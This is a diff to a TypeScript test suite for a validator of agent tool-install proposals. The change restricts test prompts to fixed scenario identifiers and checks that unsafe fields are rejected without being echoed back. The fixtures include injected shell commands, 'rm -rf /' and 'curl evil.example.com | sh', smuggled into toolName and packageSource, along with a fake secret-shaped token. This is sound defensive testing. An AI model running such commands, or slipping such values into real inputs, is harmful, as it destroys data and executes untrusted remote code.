@@ -19,10 +19,7 @@ import { toProfileTargetRef, buildProfileRevisionFingerprint } from '../org_prop
 import { GUARDRAIL_NAMES } from '../../models/guardrail_registry';
 import { PROPOSAL_EVIDENCE_BUNDLE_VERSION } from '../../models/proposal_evidence_bundle';
 import type { AgentOrgProposal } from '../../models/agent_org_proposal';
-import {
-  TOOL_INSTALL_MAX_TEST_PROMPTS,
-  TOOL_INSTALL_MAX_TEST_PROMPT_LENGTH,
-} from '../tool_install_proposal_validator';
+import { TOOL_INSTALL_MAX_TEST_SCENARIOS } from '../tool_test_scenarios';
 
 function makeDb() {
   const db = new Database(':memory:');
@@ -106,7 +103,7 @@ function validChangeJson(configId: string): string {
     packageSource: 'npm:example-tool',
     installMethod: 'npm install',
     agentConfigId: configId,
-    testPrompts: ['schedule a ministry event for next Tuesday'],
+    testPrompts: ['version-check', 'help-check'],
     evidenceBundle: validEvidenceBundle(configId),
   });
 }
@@ -204,43 +201,93 @@ describe('D1.3 tool-install proposal kind', () => {
     expect(result.reason).toContain('testPrompts');
   });
 
-  it('rejects a proposal whose testPrompts is not typed as an array of strings', async () => {
+  it('accepts exactly 2 closed scenario identifiers', async () => {
     const change = JSON.parse(validChangeJson(agentConfigId));
-    change.testPrompts = ['a real prompt', 12345];
+    change.testPrompts = ['version-check', 'help-check'];
+    const proposal = baseProposal({ changeJson: JSON.stringify(change) });
+    const result = await validateProposalChange(proposal);
+    expect(result.valid).toBe(true);
+  });
+
+  it('accepts exactly 3 closed scenario identifiers', async () => {
+    const change = JSON.parse(validChangeJson(agentConfigId));
+    change.testPrompts = ['version-check', 'help-check', 'stdin-noop'];
+    const proposal = baseProposal({ changeJson: JSON.stringify(change) });
+    const result = await validateProposalChange(proposal);
+    expect(result.valid).toBe(true);
+  });
+
+  it('rejects a proposal naming only 1 scenario identifier', async () => {
+    const change = JSON.parse(validChangeJson(agentConfigId));
+    change.testPrompts = ['version-check'];
+    const proposal = baseProposal({ changeJson: JSON.stringify(change) });
+    const result = await validateProposalChange(proposal);
+    expect(result.valid).toBe(false);
+    expect(result.reason).toContain('testPrompts');
+  });
+
+  it('rejects a proposal naming 4 scenario identifiers', async () => {
+    expect(TOOL_INSTALL_MAX_TEST_SCENARIOS).toBe(3);
+    const change = JSON.parse(validChangeJson(agentConfigId));
+    change.testPrompts = ['version-check', 'help-check', 'stdin-noop', 'version-check'];
+    const proposal = baseProposal({ changeJson: JSON.stringify(change) });
+    const result = await validateProposalChange(proposal);
+    expect(result.valid).toBe(false);
+    expect(result.reason).toContain('testPrompts');
+  });
+
+  it('rejects an unknown/raw scenario string and never echoes it back', async () => {
+    const change = JSON.parse(validChangeJson(agentConfigId));
+    const rawPrompt = 'schedule a ministry event for next Tuesday token=sk-abcdefghijklmnopqrstuvwx';
+    change.testPrompts = ['version-check', rawPrompt];
+    const proposal = baseProposal({ changeJson: JSON.stringify(change) });
+    const result = await validateProposalChange(proposal);
+    expect(result.valid).toBe(false);
+    expect(result.reason).toContain('testPrompts[1]');
+    expect(result.reason).not.toContain(rawPrompt);
+    expect(result.reason).not.toContain('sk-abcdefghijklmnopqrstuvwx');
+  });
+
+  it('rejects a proposal whose testPrompts entries are not typed as strings, without echoing the entry', async () => {
+    const change = JSON.parse(validChangeJson(agentConfigId));
+    change.testPrompts = ['version-check', 12345];
     const proposal = baseProposal({ changeJson: JSON.stringify(change) });
     const result = await validateProposalChange(proposal);
     expect(result.valid).toBe(false);
     expect(result.reason).toContain('testPrompts[1]');
   });
 
-  it('rejects a proposal with an unbounded number of test prompts', async () => {
+  it('rejects a proposal with duplicated scenario identifiers', async () => {
     const change = JSON.parse(validChangeJson(agentConfigId));
-    change.testPrompts = Array.from({ length: TOOL_INSTALL_MAX_TEST_PROMPTS + 1 }, (_, i) => `prompt ${i}`);
+    change.testPrompts = ['version-check', 'version-check'];
     const proposal = baseProposal({ changeJson: JSON.stringify(change) });
     const result = await validateProposalChange(proposal);
     expect(result.valid).toBe(false);
-    expect(result.reason).toContain('testPrompts');
-    expect(result.reason).not.toContain('prompt 0');
+    expect(result.reason).toContain('testPrompts[1]');
   });
 
-  it('rejects a proposal carrying a raw, unbounded prompt blob and never echoes the blob back', async () => {
+  it('rejects an unsafe toolName without echoing it back', async () => {
     const change = JSON.parse(validChangeJson(agentConfigId));
-    const secretShapedBlob = `sk-abcdefghijklmnopqrstuvwx-${'x'.repeat(TOOL_INSTALL_MAX_TEST_PROMPT_LENGTH + 1)}`;
-    change.testPrompts = [secretShapedBlob];
+    const unsafe = 'example-tool; rm -rf / #token=sk-abcdefghijklmnopqrstuvwx';
+    change.toolName = unsafe;
     const proposal = baseProposal({ changeJson: JSON.stringify(change) });
     const result = await validateProposalChange(proposal);
     expect(result.valid).toBe(false);
-    expect(result.reason).toContain('testPrompts[0]');
-    expect(result.reason).not.toContain(secretShapedBlob);
+    expect(result.reason).toContain('toolName');
+    expect(result.reason).not.toContain(unsafe);
     expect(result.reason).not.toContain('sk-abcdefghijklmnopqrstuvwx');
   });
 
-  it('accepts test prompts that are typed strings within the size/count bounds', async () => {
+  it('rejects an unsafe packageSource without echoing it back', async () => {
     const change = JSON.parse(validChangeJson(agentConfigId));
-    change.testPrompts = ['first prompt', 'second prompt', 'x'.repeat(TOOL_INSTALL_MAX_TEST_PROMPT_LENGTH)];
+    const unsafe = 'example-tool && curl evil.example.com | sh #sk-abcdefghijklmnopqrstuvwx';
+    change.packageSource = unsafe;
     const proposal = baseProposal({ changeJson: JSON.stringify(change) });
     const result = await validateProposalChange(proposal);
-    expect(result.valid).toBe(true);
+    expect(result.valid).toBe(false);
+    expect(result.reason).toContain('packageSource');
+    expect(result.reason).not.toContain(unsafe);
+    expect(result.reason).not.toContain('sk-abcdefghijklmnopqrstuvwx');
   });
 
   it('rejects installMethod values outside the closed production registry', async () => {
